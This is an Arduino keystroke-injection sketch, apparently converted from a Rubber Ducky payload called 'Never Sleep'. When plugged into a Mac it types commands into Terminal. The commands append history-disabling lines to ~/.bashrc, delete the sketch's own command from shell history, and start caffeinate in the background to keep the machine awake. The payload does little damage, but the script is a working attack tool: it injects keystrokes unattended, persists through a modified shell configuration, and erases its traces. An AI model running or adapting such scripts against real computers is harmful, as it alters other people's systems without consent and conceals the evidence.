// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script uses the caffeinate command
  // to keep the MacOS system from going to sleep.
  // To undo this you must kill the PID using the command 'kill PID#'
  // To find the PID use the following command 'ps aux | grep caffeinate'
  // Author: Narsty
  // Title: Never Sleep
  // Target: MacOS
  // Version: 1.0
  // Category: Executions
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("TERMINAL");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("NOHUP caffeinate -s &");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}